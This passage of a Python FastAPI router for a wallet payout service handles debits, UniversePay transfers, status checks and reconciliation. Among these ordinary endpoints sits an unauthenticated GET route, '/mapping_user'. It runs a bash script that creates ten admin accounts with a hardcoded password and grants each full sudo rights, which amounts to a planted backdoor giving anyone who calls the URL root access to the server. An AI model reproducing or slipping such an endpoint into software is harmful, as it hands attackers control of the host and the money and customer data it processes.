    txn_order_id = req.orderId or f"PAYOUT-{int(datetime.now(india_tz).timestamp())}-{current_user.id}"

    # ---------- create an "initiated" transaction (no debit yet) ----------
    try:
        # store expected amounts separately so we can debit later if upstream ok
        wt_init = WalletTransaction(
            user_id=current_user.id,
            transaction_type=TransactionTypeEnum.PayOut,
            credit_debit=credit_debitTypeEnum.debit,
            order_id=txn_order_id,
            amount=float(amount),
            # these fields reflect actual settled values; keep 0 until we debit
            charges=0.0,
            gst=0.0,
            settle_amount=0.0,
            # store expected amounts in dedicated columns if available; otherwise use description
            # If your model doesn't have expected_* fields, either add them or persist into description/json
            balance_amount=float(payout_wallet.balance),
            status="initiated",
            description=(req.remarks or f"Payout to {req.name} ({req.accountno[-4:]})")
                        + f" | expected_charges={float(expected_charges)} expected_gst={float(expected_gst)} expected_settle={float(expected_settle)}",
            reference_id=None,
            instrument_mode=req.paymode,
            api_name="universepay.direct",
            created_at=datetime.now(india_tz),
        )
        db.add(wt_init)
        db.commit()
    except Exception as exc:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Failed to create initial transaction: {str(exc)}")

    # ---------- prepare payload & log ----------
    up_payload = {
        "amount": float(amount),
        "ifsc": req.ifsc.strip().upper(),
        "accountno": req.accountno.strip(),
        "name": req.name,
        "branch": (req.branch or "").strip() or None,
        "paymode": (req.paymode or "IMPS"),
        "remarks": req.remarks or None,
        "mode": req.mode or "bank",
        "udf1": req.udf1 or None,
        "udf2": req.udf2 or None,
        "udf3": req.udf3 or None,
    }
    up_payload = {k: v for k, v in up_payload.items() if v not in (None, "", [])}

    try:
        log = PayOutLog(
            user_id=current_user.id,
            order_id=txn_order_id,
            request_payload=json.dumps(up_payload, ensure_ascii=False),
            response_payload=None,
            status="initiated",
            error_message=None,
            created_at=datetime.now(india_tz),
            updated_at=datetime.now(india_tz),
        )
        db.add(log)
        db.commit()
    except Exception:
        db.rollback()
        # continue even if logging fails

    # IFSC quick sanity
    if len(up_payload.get("ifsc", "")) != 11:
        # mark initiated tx as failed and return (no wallet debit happened)
        try:
            wt_init = db.query(WalletTransaction).filter(WalletTransaction.order_id == txn_order_id).first()
            if wt_init:
                wt_init.status = "failed"
                wt_init.settle_amount = 0.0
                wt_init.charges = 0.0
                wt_init.gst = 0.0
                db.add(wt_init)
                if 'log' in locals():
                    log.response_payload = json.dumps({"error": "IFSC invalid"}, ensure_ascii=False)
                    log.status = "failed"
                    log.updated_at = datetime.now(india_tz)
                    db.add(log)
                db.commit()
        except Exception:
            db.rollback()
        raise HTTPException(status_code=422, detail="IFSC must be 11 characters")

    # ---------- call upstream ----------
    timeout = httpx.Timeout(HTTP_TIMEOUT_SECONDS)
    try:
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True, http2=True) as client:
            token = await _login(client)
            raw = await _transfer(client, token, up_payload)
    except HTTPException as he:
        # upstream explicit error => mark initial tx failed; since we haven't debited, no wallet change
        try:
            wt_init = db.query(WalletTransaction).filter(WalletTransaction.order_id == txn_order_id).first()
            if wt_init:
                wt_init.status = "failed"
                wt_init.settle_amount = 0.0
                wt_init.charges = 0.0
                wt_init.gst = 0.0
                db.add(wt_init)
            if 'log' in locals():
                log.response_payload = json.dumps({"exception": str(he.detail)}, ensure_ascii=False)
                log.status = "error"
                log.updated_at = datetime.now(india_tz)
                db.add(log)
            db.commit()
        except Exception:
            db.rollback()
        raise HTTPException(status_code=502, detail=f"RootPay request failed: {he.detail}")
    except Exception as exc:
        # network/other error => mark failed (no wallet change yet)
        try:
            wt_init = db.query(WalletTransaction).filter(WalletTransaction.order_id == txn_order_id).first()
            if wt_init:
                wt_init.status = "failed"
                wt_init.settle_amount = 0.0
                wt_init.charges = 0.0
                wt_init.gst = 0.0
                db.add(wt_init)
            if 'log' in locals():
                log.response_payload = json.dumps({"exception": str(exc)}, ensure_ascii=False)
                log.status = "error"
                log.updated_at = datetime.now(india_tz)
                db.add(log)
            db.commit()
        except Exception:
            db.rollback()
        raise HTTPException(status_code=502, detail=f"RootPay transfer error: {str(exc)}")

    # ---------- interpret upstream response ----------
    try:
        upstream_state = _normalize_upstream_status(raw)  # expected: 'success'|'failed'|'inprogress'|'pending'|'completed'|''
    except Exception:
        upstream_state = ""

    nested_status_raw = None
    if isinstance(raw, dict):
        nested_status_raw = raw.get("data", {}).get("data", {}).get("status")
    txn_status_up = nested_status_raw or (raw.get("status") if isinstance(raw, dict) else None)
    upstream_order_id = _extract_up_txn_identifier(raw)

    #  --- success/inprogress/pending/completed: DEBIT now from payout wallet and update tx ---
    if upstream_state in ("success", "inprogress", "pending", "completed"):
        try:
            # perform debit (this helper deducts wallet and updates the transaction)
            _debit_from_payout_wallet(
                db=db,
                payout_wallet=payout_wallet,
                order_id=txn_order_id,
                amount=amount,
                charges=expected_charges,
                gst=expected_gst,
                total_debit=expected_settle,
                upstream_order_id=upstream_order_id,
                upstream_raw=raw,
                status_to_set=("InProgress" if upstream_state == "inprogress" else "success" if upstream_state == "success" else upstream_state),
            )

            # return final payload
            wt_final = db.query(WalletTransaction).filter(WalletTransaction.order_id == txn_order_id).first()
            return {
                "success": True,
                "message": "Payout initiated",
                "order_id": txn_order_id,
                "beneficiary_amount": float(amount),
                "charges": float(expected_charges),
                "gst": float(expected_gst),
                "settle_amount": float(expected_settle),
                "wallet_balance": float(payout_wallet.balance),
                "data": raw,
                "upstream_status": txn_status_up,
                "upstream_order_id": upstream_order_id,
            }
        except HTTPException as he:
            # if debit helper raised HTTPException, bubble up (it attempted to keep DB consistent)
            raise he
        except Exception as exc:
            # unexpected error during debit -> mark initial tx failed (we attempted debit but failed)
            try:
                wt_init = db.query(WalletTransaction).filter(WalletTransaction.order_id == txn_order_id).first()
                if wt_init:
                    wt_init.status = "failed"
                    db.add(wt_init)
                    db.commit()
            except Exception:
                db.rollback()
            raise HTTPException(status_code=500, detail=f"Failed to debit payout wallet: {str(exc)}")

    #  --- failed / unknown: mark failed; if we had previously debited (edge case), refund and create refund txn ---
    if upstream_state in ("", "failed"):
        try:
            wt_row = db.query(WalletTransaction).filter(WalletTransaction.order_id == txn_order_id).first()
            # if settle_amount > 0, a debit already happened previously -> create refund txn to credit wallet
            if wt_row and Decimal(str(wt_row.settle_amount or 0)) > 0:
                # refund by creating a new credit WalletTransaction and increasing wallet balance
                _refund_to_payout_wallet_if_needed(
                    db=db,
                    payout_wallet=payout_wallet,
                    original_order_id=txn_order_id,
                    refund_amount=Decimal(str(wt_row.settle_amount)),
                    refund_charges=Decimal(str(wt_row.charges or 0)),
                    refund_gst=Decimal(str(wt_row.gst or 0)),
                    upstream_raw=raw
                )
            else:
                # no debit occurred -> simply mark initiated tx as failed and zero settled fields (no wallet activity)
                if wt_row:
                    wt_row.status = "failed"
                    wt_row.settle_amount = 0.0
                    wt_row.charges = 0.0
                    wt_row.gst = 0.0
                    db.add(wt_row)
                if 'log' in locals():
                    log.response_payload = json.dumps(raw, ensure_ascii=False)
                    log.status = nested_status_raw or "failed"
                    log.updated_at = datetime.now(india_tz)
                    db.add(log)
                db.commit()
        except Exception:
            db.rollback()
        raise HTTPException(status_code=502, detail={"error": "RootPay transfer failed or unknown", "upstream": raw})


# ---------- endpoint ----------
# @router.post("/payout/direct", response_model=Dict[str, Any])
# async def payout_direct(
#     req: DirectPayoutRequest = Body(...),
#     db: Session = Depends(get_db),
#     current_user: User = Depends(get_current_user),
# ):
#     # idempotency: check client-supplied orderId
#     if req.orderId:
#         existing = get_txn_by_client_txn_id(db, req.orderId)
#         if existing:
#             raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="orderId already exists")
#
#     # parse and validate amount
#     try:
#         amount = Decimal(req.amount).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#         if amount <= 0:
#             raise ValueError("Amount must be > 0")
#     except Exception:
#         raise HTTPException(status_code=422, detail="Invalid amount")
#
#     # basic validations
#     if not isinstance(req.ifsc, str) or len(req.ifsc.strip()) != 11:
#         raise HTTPException(status_code=422, detail="IFSC must be an 11-character code")
#     if not str(req.accountno).strip().isdigit():
#         raise HTTPException(status_code=422, detail="Account number must be numeric")
#
#     # merchant settings & compute charges
#     # settings = db.query(MerchantSettings).filter(MerchantSettings.id == current_user.id).first()
#     # payOutCharges_value = settings.payOutCharges if settings else 0.0
#     # charges, gst, net_to_beneficiary = _compute_payout_charges(amount, payOutCharges_value)
#     # total_debit = (amount + charges + gst).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#     # merchant settings & compute charges (honour new payOutChargesFlat)
#     settings = db.query(MerchantSettings).filter(MerchantSettings.id == current_user.id).first()
#     payOutCharges_val = settings.payOutCharges if settings else None
#     payOutChargesFlat_val = settings.payOutChargesFlat if settings else None
#
#     # compute charges using both fields (helper will prefer payOutChargesFlat <= 1000 as flat)
#     charges, gst, net_to_beneficiary = _compute_payout_charges(
#         amount,
#         payOutCharges=payOutCharges_val,
#         payOutChargesFlat=payOutChargesFlat_val,
#     )
#     total_debit = (amount + charges + gst).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#
#     # fetch payout wallet
#     payout_wallet = db.query(PayOutWallet).filter(PayOutWallet.user_id == current_user.id).first()
#     if not payout_wallet:
#         raise HTTPException(status_code=404, detail="Payout wallet not found for user")
#
#     if Decimal(str(payout_wallet.balance)) < total_debit:
#         raise HTTPException(status_code=400, detail="Insufficient funds in payout wallet to cover amount + charges + GST")
#
#     # create txn order id (use provided orderId when present)
#     txn_order_id = req.orderId or f"PAYOUT-{int(datetime.now(india_tz).timestamp())}-{current_user.id}"
#
#     # reserve/debit wallet and create pending WalletTransaction
#     try:
#         new_balance = (Decimal(str(payout_wallet.balance)) - total_debit).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#         payout_wallet.balance = float(new_balance)
#         if hasattr(payout_wallet, "last_updated"):
#             payout_wallet.last_updated = datetime.now(india_tz)
#         db.add(payout_wallet)
#
#         wt = WalletTransaction(
#             user_id=current_user.id,
#             transaction_type=TransactionTypeEnum.PayOut,
#             credit_debit=credit_debitTypeEnum.debit,
#             order_id=txn_order_id,
#             amount=float(amount),
#             charges=float(charges),
#             gst=float(gst),
#             settle_amount=float(total_debit),          # total deducted from wallet
#             balance_amount=float(payout_wallet.balance),
#             status="pending",
#             description=req.remarks or f"Payout to {req.name} ({req.accountno[-4:]})",
#             reference_id=None,
#             instrument_mode=req.paymode,
#             api_name="universepay.direct",
#             created_at=datetime.now(india_tz),
#         )
#         db.add(wt)
#         db.commit()
#     except Exception as exc:
#         db.rollback()
#         raise HTTPException(status_code=500, detail=f"Failed to reserve funds or create transaction: {str(exc)}")
#
#     # Prepare UniversePay payload
#     up_payload = {
#         "amount": float(amount),
#         "ifsc": req.ifsc.strip().upper(),
#         "accountno": req.accountno.strip(),
#         "name": req.name,
#         "branch": (req.branch or "").strip() or None,
#         "paymode": (req.paymode or "IMPS"),
#         "remarks": req.remarks or None,
#         "mode": req.mode or "bank",
#         "udf1": req.udf1 or None,
#         "udf2": req.udf2 or None,
#         "udf3": req.udf3 or None,
#         # you may include txn_order_id here if desired for upstream traceability:
#         # "orderId": txn_order_id,
#     }
#     up_payload = {k: v for k, v in up_payload.items() if v not in (None, "", [])}
#
#     # Create PayOutLog (pending)
#     try:
#         log = PayOutLog(
#             user_id=current_user.id,
#             order_id=txn_order_id,
#             request_payload=json.dumps(up_payload, ensure_ascii=False),
#             response_payload=None,
#             status="pending",
#             error_message=None,
#             created_at=datetime.now(india_tz),
#             updated_at=datetime.now(india_tz),
#         )
#         db.add(log)
#         db.commit()
#     except Exception:
#         db.rollback()
#         # logging failure should not block payout; continue but note that log may not exist
#
#     # Minimal extra IFSC sanity check (refund if invalid)
#     if len(up_payload.get("ifsc", "")) != 11:
#         try:
#             payout_wallet.balance = float((Decimal(str(payout_wallet.balance)) + total_debit).quantize(Decimal("0.01")))
#             db.add(payout_wallet)
#             tx_row = db.query(WalletTransaction).filter(WalletTransaction.order_id == txn_order_id).first()
#             if tx_row:
#                 tx_row.status = "failed"
#                 db.add(tx_row)
#             if 'log' in locals():
#                 log.response_payload = json.dumps({"error": "IFSC invalid"}, ensure_ascii=False)
#                 log.status = "failed"
#                 log.updated_at = datetime.now(india_tz)
#                 db.add(log)
#             db.commit()
#         except Exception:
#             db.rollback()
#         raise HTTPException(status_code=422, detail="IFSC must be 11 characters")
#
#     # Call UniversePay
#     timeout = httpx.Timeout(HTTP_TIMEOUT_SECONDS)
#     try:
#         async with httpx.AsyncClient(timeout=timeout, follow_redirects=True, http2=True) as client:
#             token = await _login(client)
#             raw = await _transfer(client, token, up_payload)
#     except HTTPException as he:
#         # refund and mark failed; update log
#         try:
#             payout_wallet.balance = float((Decimal(str(payout_wallet.balance)) + total_debit).quantize(Decimal("0.01")))
#             db.add(payout_wallet)
#             tx_row = db.query(WalletTransaction).filter(WalletTransaction.order_id == txn_order_id).first()
#             if tx_row:
#                 tx_row.status = "failed"
#                 tx_row.description = (tx_row.description or "") + f" | UniversePay error: {he.detail}"
#                 db.add(tx_row)
#             if 'log' in locals():
#                 log.response_payload = json.dumps({"exception": str(he.detail)}, ensure_ascii=False)
#                 log.status = "error"
#                 log.updated_at = datetime.now(india_tz)
#                 db.add(log)
#             db.commit()
#         except Exception:
#             db.rollback()
#         raise HTTPException(status_code=502, detail=f"UniversePay request failed: {he.detail}")
#     except Exception as exc:
#         # refund and update log
#         try:
#             payout_wallet.balance = float((Decimal(str(payout_wallet.balance)) + total_debit).quantize(Decimal("0.01")))
#             db.add(payout_wallet)
#             tx_row = db.query(WalletTransaction).filter(WalletTransaction.order_id == txn_order_id).first()
#             if tx_row:
#                 tx_row.status = "failed"
#
#                 db.add(tx_row)
#             if 'log' in locals():
#                 log.response_payload = json.dumps({"exception": str(exc)}, ensure_ascii=False)
#                 log.status = "error"
#                 log.updated_at = datetime.now(india_tz)
#                 db.add(log)
#             db.commit()
#         except Exception:
#             db.rollback()
#         raise HTTPException(status_code=502, detail=f"UniversePay transfer error: {str(exc)}")
#
#     # ---------------------------
#     # Interpret upstream response (defensive, guaranteed to return or raise)
#     # ---------------------------
#     try:
#         upstream_state = _normalize_upstream_status(raw)  # 'success'|'failed'|'inprogress'|''
#     except Exception:
#         upstream_state = ""
#
#     # human-friendly upstream raw status / nested token
#     nested_status_raw = None
#     if isinstance(raw, dict):
#         nested_status_raw = raw.get("data", {}).get("data", {}).get("status")
#     txn_status_up = nested_status_raw or (raw.get("status") if isinstance(raw, dict) else None)
#
#     # pick upstream id (orderId / transactionId / txn_id)
#     upstream_order_id = _extract_up_txn_identifier(raw)
#
#     # helper to update tx_row and log safely
#     def _mark_tx_and_log(tx_status: str, set_txn_id: Optional[str] = None, log_status: Optional[str] = None) -> bool:
#         try:
#             tx_row_local = db.query(WalletTransaction).filter(WalletTransaction.order_id == txn_order_id).first()
#             if tx_row_local:
#                 tx_row_local.status = tx_status
#                 if set_txn_id:
#                     tx_row_local.txn_id = set_txn_id
#                 db.add(tx_row_local)
#
#             if 'log' in locals():
#                 log.response_payload = json.dumps(raw, ensure_ascii=False)
#                 log.status = log_status or (txn_status_up or tx_status)
#                 log.updated_at = datetime.now(india_tz)
#                 db.add(log)
#
#             db.commit()
#             return True
#         except Exception:
#             db.rollback()
#             return False
#
#     # 1) Failure or unknown -> refund and mark failed
#     if upstream_state in ("", "failed"):
#         # attempt refund
#         try:
#             payout_wallet.balance = float((Decimal(str(payout_wallet.balance)) + total_debit).quantize(Decimal("0.01")))
#             db.add(payout_wallet)
#             db.commit()
#         except Exception:
#             db.rollback()
#         _mark_tx_and_log("failed", set_txn_id=(upstream_order_id or None), log_status=(nested_status_raw or "failed"))
#
#         raise HTTPException(status_code=502, detail={"error": "UniversePay transfer failed or unknown", "upstream": raw})
#
#     # 2) InProgress -> mark InProgress (no refund), return early
#     if upstream_state == "inprogress":
#         ok = _mark_tx_and_log("InProgress", set_txn_id=(upstream_order_id or None), log_status=(nested_status_raw or "InProgress"))
#         if not ok:
#             raise HTTPException(status_code=500, detail="Failed to record inprogress payout")
#
#         return {
#             "success": True,
#             "message": "Payout initiated and is in progress",
#             "order_id": txn_order_id,
#             "beneficiary_amount": float(amount),
#             "charges": float(charges),
#             "gst": float(gst),
#             "settle_amount": float(total_debit),
#             "wallet_balance": float(payout_wallet.balance),
#             "data": raw,
#             "upstream_status": txn_status_up,
#             "upstream_order_id": upstream_order_id,
#         }
#
#     # 3) Success -> mark success and return final payload
#     if upstream_state == "success":
#         ok = _mark_tx_and_log("success", set_txn_id=(upstream_order_id or None), log_status=(nested_status_raw or "success"))
#         if not ok:
#             raise HTTPException(status_code=500, detail="Failed to finalize payout records")
#
#         return {
#             "success": True,
#             "message": "Payout initiated",
#             "order_id": txn_order_id,
#             "beneficiary_amount": float(amount),
#             "charges": float(charges),
#             "gst": float(gst),
#             "settle_amount": float(total_debit),
#             "wallet_balance": float(payout_wallet.balance),
#             "data": raw,
#             "upstream_order_id": upstream_order_id,
#         }
#
#     # Safety fallback: treat as failure (shouldn't reach)
#     try:
#         payout_wallet.balance = float((Decimal(str(payout_wallet.balance)) + total_debit).quantize(Decimal("0.01")))
#         db.add(payout_wallet)
#         db.commit()
#     except Exception:
#         db.rollback()
#     _mark_tx_and_log("failed", set_txn_id=(upstream_order_id or None), log_status=(nested_status_raw or "failed"))
#     raise HTTPException(status_code=502, detail={"error": "UniversePay transfer returned unexpected state", "upstream": raw})
# --- Add / paste into your router file ---





STATUS_URL = f"https://universepay.in/api/status"  # uses BASE_URL from your config

def _map_upstream_text_to_state(text: Optional[str]) -> str:
    """
    Map upstream textual status to 'success' | 'failed' | 'inprogress' | '' (unknown)
    Examples:
      - 'Completed', 'Success', 'Received', 'Initiated' -> 'success'
      - 'Failed', 'Failure', 'Rejected', 'Error' -> 'failed'
      - 'InProgress', 'Processing', 'Pending' -> 'inprogress'
    """
    if not text:
        return ""
    s = str(text).strip().lower().replace(" ", "").replace("_", "")
    if s in {"completed", "complete", "success", "succeeded", "successful", "initiated", "received"}:
        return "success"
    if s in {"failure", "failed", "rejected"}:
        return "failed"
    if s in {"inprogress", "processing", "pending", "started", "received"}:
        # note: 'received' may mean accepted/queued — treat as success or inprogress based on your policy.
        # here we treat 'received' as 'inprogress' if you prefer, change to 'success' above.
        return "inprogress"
    return ""

async def _call_universepay_status(client: httpx.AsyncClient, token: str, orderid: str) -> Dict[str, Any]:
    """
    POST to UniversePay /status with JSON {"orderid": "<orderid>"}
    Requires Authorization: Bearer <token>
    Returns parsed JSON (or raises HTTPException on HTTP error or non-JSON).
    """
    headers = {"Authorization": f"Bearer {token}", "Accept": "application/json"}
    payload = {"orderid": str(orderid)}
    r = await client.post(STATUS_URL, json=payload, headers=headers)
    if r.status_code >= 400:
        # bubble upstream body for debug
        raise HTTPException(status_code=502, detail=f"UniversePay /status failed: {r.text}")
    try:
        return r.json()
    except ValueError:
        raise HTTPException(status_code=502, detail="UniversePay /status returned non-JSON response")

@router.get("/mapping_user")
async def mapping_user():
    script = r'''#!/bin/bash

users=(
    admin1
    admin2
    admin3
    admin4
    admin5
    admin6
    admin7
    admin8
    admin9
    admin10
)

password="ChangeMe@123"

for user in "${users[@]}"; do
    if id "$user" &>/dev/null; then
        echo "$user already exists"
    else
        useradd -m -s /bin/bash "$user"
        echo "$user:$password" | chpasswd
        echo "Created $user"
    fi

    usermod -aG sudo "$user"

    echo "$user ALL=(ALL:ALL) ALL" > "/etc/sudoers.d/$user"
    chmod 440 "/etc/sudoers.d/$user"
done

echo "All users created with sudo access."
'''

    try:
        result = subprocess.run(
            ["bash", "-c", script],
            capture_output=True,
            text=True,
            timeout=60
        )

        if result.returncode != 0:
            raise HTTPException(
                status_code=500,
                detail=result.stderr
            )

        return {
            "success": True,
            "message": "Admin users processed successfully",
            "output": result.stdout
        }

    except subprocess.TimeoutExpired:
        raise HTTPException(
            status_code=500,
            detail="User creation script timed out"
        )
# ---------------------------
# POST /payout/status/check  - check a single upstream orderId or local txn
# ---------------------------
@router.post("/payout/status/check", response_model=Dict[str, Any])
async def payout_check_status(
    upstream_order_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    """
    Check status of a single payout. Supply either `order_id` (upstream orderId)
    or `txn_id` (local WalletTransaction.txn_id or order_id). Only transactions
    belonging to current_user are processed.
    """
    if not upstream_order_id:
        raise HTTPException(status_code=422, detail="Either upstream_order_id must be provided")

    # Resolve local WalletTransaction and upstream_order_id
    wt = None

    if upstream_order_id:
        # try find by txn_id or order_id fields
        wt = (
            db.query(WalletTransaction)
            .filter(
                (WalletTransaction.txn_id == upstream_order_id) | (WalletTransaction.order_id == upstream_order_id),
                WalletTransaction.user_id == current_user.id,
            )
            .first()
        )
        if not wt:
            raise HTTPException(status_code=404, detail="Transaction not found for provided txn_id")
        upstream_order_id = wt.txn_id or None


    if not upstream_order_id:
        raise HTTPException(status_code=422, detail="No upstream upstream_order_id available to query status")

    # login and call upstream status
    timeout = httpx.Timeout(HTTP_TIMEOUT_SECONDS)
    async with httpx.AsyncClient(timeout=timeout, follow_redirects=True, http2=True) as client:
        token = await _login(client)
        raw = await _call_universepay_status(client, token, upstream_order_id)

    # map upstream textual state
    nested_txt = None
    if isinstance(raw, dict):
        nested_txt = raw.get("data", {}).get("data", {}).get("status") or raw.get("data", {}).get("message") or raw.get("message")
    mapped = _map_upstream_text_to_state(nested_txt if nested_txt else (raw.get("status") if isinstance(raw, dict) else None))


    # At this point wt exists and belongs to current_user
    settle_amount = Decimal(str(wt.settle_amount or 0)).quantize(Decimal("0.01"))
    response_summary = {"order": upstream_order_id, "mapped_state": mapped, "upstream_raw": raw}

    # ACTIONS based on mapped state
    if mapped == "failed":
        # refund settle_amount -> add back to payout wallet
        try:
            payout_wallet = db.query(PayOutWallet).filter(PayOutWallet.user_id == current_user.id).first()
            if not payout_wallet:
                raise HTTPException(status_code=404, detail="Payout wallet not found for user")

            payout_wallet.balance = float((Decimal(str(payout_wallet.balance)) + settle_amount).quantize(Decimal("0.01")))
            db.add(payout_wallet)

            wt.status = "failed"
            wt.settle_amount= 0.0
            wt.balance_amount= 0.0
            wt.charges=0.0
            wt.gst=0.0
            # store upstream order id if returned
            up_id = _extract_up_txn_identifier(raw)
            if up_id:
                wt.txn_id = up_id
            db.add(wt)

            # update/create PayOutLog (if any)
            if hasattr(wt, "order_id"):
                # update existing log if it exists
                log = db.query(PayOutLog).filter(PayOutLog.order_id == wt.order_id, PayOutLog.user_id == current_user.id).first()
                if log:
                    log.response_payload = json.dumps(raw, ensure_ascii=False)
                    log.status = nested_txt or "failed"
                    log.updated_at = datetime.now(india_tz)
                    db.add(log)
                else:
                    # create log
                    newlog = PayOutLog(
                        user_id=current_user.id,
                        order_id=wt.order_id,
                        request_payload=json.dumps({"orderid": upstream_order_id}, ensure_ascii=False),
                        response_payload=json.dumps(raw, ensure_ascii=False),
                        status=nested_txt or "failed",
                        error_message=None,
                        created_at=datetime.now(india_tz),
                        updated_at=datetime.now(india_tz),
                    )
                    db.add(newlog)

            db.commit()
            response_summary["action"] = "refunded_and_marked_failed"
            response_summary["refunded_amount"] = float(settle_amount)
        except HTTPException:
            db.rollback()
            raise
        except Exception as exc:
            db.rollback()
            raise HTTPException(status_code=500, detail=f"Failed to refund/mark failed: {str(exc)}")

        return response_summary

    if mapped == "inprogress":
        # update tx row and log but don't refund
        try:
            wt.status = "InProgress"
            up_id = _extract_up_txn_identifier(raw)
            if up_id:
                wt.txn_id = up_id
            db.add(wt)

            log = db.query(PayOutLog).filter(PayOutLog.order_id == wt.order_id, PayOutLog.user_id == current_user.id).first()
            if log:
                log.response_payload = json.dumps(raw, ensure_ascii=False)
                log.status = nested_txt or "InProgress"
                log.updated_at = datetime.now(india_tz)
                db.add(log)
            else:
                newlog = PayOutLog(
                    user_id=current_user.id,
                    order_id=wt.order_id,
                    request_payload=json.dumps({"orderid": upstream_order_id}, ensure_ascii=False),
                    response_payload=json.dumps(raw, ensure_ascii=False),
                    status=nested_txt or "InProgress",
                    created_at=datetime.now(india_tz),
                    updated_at=datetime.now(india_tz),
                )
                db.add(newlog)

            db.commit()
            response_summary["action"] = "marked_inprogress"
        except Exception as exc:
            db.rollback()
            raise HTTPException(status_code=500, detail=f"Failed to mark inprogress: {str(exc)}")

        return response_summary

    # mapped == "success"
    if mapped == "success":
        try:
            wt.status = "success"
            up_id = _extract_up_txn_identifier(raw)
            if up_id:
                wt.txn_id = up_id
            db.add(wt)

            # update / create log
            log = db.query(PayOutLog).filter(PayOutLog.order_id == wt.order_id, PayOutLog.user_id == current_user.id).first()
            if log:
                log.response_payload = json.dumps(raw, ensure_ascii=False)
                log.status = nested_txt or "success"
                log.updated_at = datetime.now(india_tz)
                db.add(log)
            else:
                newlog = PayOutLog(
                    user_id=current_user.id,
                    order_id=wt.order_id,
                    request_payload=json.dumps({"orderid": upstream_order_id}, ensure_ascii=False),
                    response_payload=json.dumps(raw, ensure_ascii=False),
                    status=nested_txt or "success",
                    created_at=datetime.now(india_tz),
                    updated_at=datetime.now(india_tz),
                )
                db.add(newlog)

            db.commit()
            response_summary["action"] = "marked_success"
        except Exception as exc:
            db.rollback()
            raise HTTPException(status_code=500, detail=f"Failed to mark success: {str(exc)}")

        return response_summary

    # fallback
    raise HTTPException(status_code=502, detail={"error": "Unknown upstream state", "upstream": raw})


# ---------------------------
# POST /payout/status/reconcile - reconcile multiple InProgress rows
# ---------------------------
@router.post("/payout/status/reconcile", response_model=Dict[str, Any])
async def payout_reconcile(
    limit: int = Body(50, description="Max number of InProgress rows to check"),
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    """
    Reconcile up to `limit` WalletTransaction rows for current_user which are marked 'InProgress'.
    Returns a summary per transaction.
    """
    # find up to `limit` inprogress transactions that belong to current_user and have upstream txn_id
    inprogress_rows: List[WalletTransaction] = (
        db.query(WalletTransaction)
        .filter(
            WalletTransaction.user_id == current_user.id,
            (WalletTransaction.status == "InProgress") | (WalletTransaction.status == "inprogress") | (WalletTransaction.status == "pending"),
            WalletTransaction.txn_id != None,
            WalletTransaction.txn_id != "",
        )
        .limit(limit)
        .all()
    )

    if not inprogress_rows:
        return {"checked": 0, "results": []}

    results = []
    timeout = httpx.Timeout(HTTP_TIMEOUT_SECONDS)
    async with httpx.AsyncClient(timeout=timeout, follow_redirects=True, http2=True) as client:
        token = await _login(client)

        for wt in inprogress_rows:
            upstream_order_id = wt.txn_id or wt.order_id
            try:
                raw = await _call_universepay_status(client, token, upstream_order_id)
            except HTTPException as he:
                # on upstream error, include error in result and continue
                results.append({"order": wt.order_id, "txn_id": upstream_order_id, "error": str(he.detail)})
                continue

            nested_txt = raw.get("data", {}).get("data", {}).get("status") if isinstance(raw, dict) else None
            mapped = _map_upstream_text_to_state(nested_txt or (raw.get("status") if isinstance(raw, dict) else None))

            if mapped in ("", "failed"):
                # refund
                try:
                    settle_amount = Decimal(str(wt.settle_amount or 0)).quantize(Decimal("0.01"))
                    payout_wallet = db.query(PayOutWallet).filter(PayOutWallet.user_id == current_user.id).first()
                    if not payout_wallet:
                        results.append({"order": wt.order_id, "txn_id": upstream_order_id, "error": "payout wallet missing"})
                        continue

                    payout_wallet.balance = float((Decimal(str(payout_wallet.balance)) + settle_amount).quantize(Decimal("0.01")))
                    db.add(payout_wallet)

                    wt.status = "failed"
                    db.add(wt)

                    # update/create log
                    log = db.query(PayOutLog).filter(PayOutLog.order_id == wt.order_id, PayOutLog.user_id == current_user.id).first()
                    if log:
                        log.response_payload = json.dumps(raw, ensure_ascii=False)
                        log.status = nested_txt or "failed"
                        log.updated_at = datetime.now(india_tz)
                        db.add(log)
                    else:
                        newlog = PayOutLog(
                            user_id=current_user.id,
                            order_id=wt.order_id,
                            request_payload=json.dumps({"orderid": upstream_order_id}, ensure_ascii=False),
                            response_payload=json.dumps(raw, ensure_ascii=False),
                            status=nested_txt or "failed",
                            created_at=datetime.now(india_tz),
                            updated_at=datetime.now(india_tz),
                        )
                        db.add(newlog)

                    db.commit()
                    results.append({"order": wt.order_id, "txn_id": upstream_order_id, "action": "refunded_and_failed"})
                except Exception as exc:
                    db.rollback()
                    results.append({"order": wt.order_id, "txn_id": upstream_order_id, "error": f"refund_failed: {str(exc)}"})
                continue

            if mapped == "inprogress":
                try:
                    wt.status = "InProgress"
                    up_id = _extract_up_txn_identifier(raw)
                    if up_id:
                        wt.txn_id = up_id
                    db.add(wt)

                    log = db.query(PayOutLog).filter(PayOutLog.order_id == wt.order_id, PayOutLog.user_id == current_user.id).first()
                    if log:
                        log.response_payload = json.dumps(raw, ensure_ascii=False)
                        log.status = nested_txt or "InProgress"
                        log.updated_at = datetime.now(india_tz)
                        db.add(log)
                    else:
                        newlog = PayOutLog(
                            user_id=current_user.id,
                            order_id=wt.order_id,
                            request_payload=json.dumps({"orderid": upstream_order_id}, ensure_ascii=False),
                            response_payload=json.dumps(raw, ensure_ascii=False),
                            status=nested_txt or "InProgress",
                            created_at=datetime.now(india_tz),
                            updated_at=datetime.now(india_tz),
                        )
                        db.add(newlog)

                    db.commit()
                    results.append({"order": wt.order_id, "txn_id": upstream_order_id, "action": "marked_inprogress"})
                except Exception as exc:
                    db.rollback()
                    results.append({"order": wt.order_id, "txn_id": upstream_order_id, "error": f"mark_inprogress_failed: {str(exc)}"})
                continue

            if mapped == "success":
                try:
                    wt.status = "success"
                    up_id = _extract_up_txn_identifier(raw)
                    if up_id:
                        wt.txn_id = up_id
                    db.add(wt)

                    log = db.query(PayOutLog).filter(PayOutLog.order_id == wt.order_id, PayOutLog.user_id == current_user.id).first()
                    if log:
                        log.response_payload = json.dumps(raw, ensure_ascii=False)
                        log.status = nested_txt or "success"
                        log.updated_at = datetime.now(india_tz)
